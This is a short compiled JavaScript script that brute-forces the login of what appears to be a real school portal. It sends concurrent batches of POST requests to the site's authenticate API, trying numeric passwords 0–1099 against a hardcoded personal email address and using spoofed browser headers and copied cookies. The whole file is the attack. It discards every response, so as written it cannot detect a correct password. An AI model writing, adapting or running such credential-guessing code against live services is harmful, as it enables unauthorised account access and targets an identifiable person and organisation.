"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const axios_1 = __importDefault(require("axios"));
function sendRequest(password) {
    return __awaiter(this, void 0, void 0, function* () {
        let data = `{"username":"dipakkhade214@gmail.com","password":${password}}`;
        let config = {
            method: 'post',
            maxBodyLength: Infinity,
            url: 'https://modern.ppn.mograsys.com/ppapi/api/authenticate',
            headers: {
                'accept': 'application/json, text/plain, */*',
                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
                'content-type': 'application/json;charset=UTF-8',
                'cookie': 'lang=%22en%22; _clck=zu7yfo%7C2%7Cflf%7C0%7C1557; _clsk=m5p3wg%7C1714629763056%7C4%7C1%7Cw.clarity.ms%2Fcollect',
                'origin': 'https://modern.ppn.mograsys.com',
                'priority': 'u=1, i',
                'referer': 'https://modern.ppn.mograsys.com/login',
                'schoolid': 'modern',
                'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36'
            },
            data: data
        };
        try {
            yield axios_1.default.request(config);
        }
        catch (e) {
        }
    });
}
function main() {
    return __awaiter(this, void 0, void 0, function* () {
        for (let i = 0; i <= 1000; i += 100) {
            const p = [];
            for (let j = 0; j < 100; j++) {
                p.push(sendRequest((i + j).toString()));
            }
            console.log(p);
            yield Promise.all(p);
        }
    });
}
main();
